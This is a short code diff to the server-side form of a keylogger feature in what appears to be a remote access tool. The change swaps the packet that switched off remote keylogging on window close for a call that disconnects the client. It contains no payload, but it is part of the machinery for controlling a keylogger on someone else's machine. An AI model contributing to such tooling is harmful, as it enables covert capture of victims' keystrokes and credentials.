@@ -36,11 +36,12 @@ namespace Server.Forms
 
         private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
         {
+            try
+            {
+                Client.Disconnected();
+            }
+            catch { }
             Sb?.Clear();
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-            msgpack.ForcePathObject("isON").AsString = "false";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
 
         private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
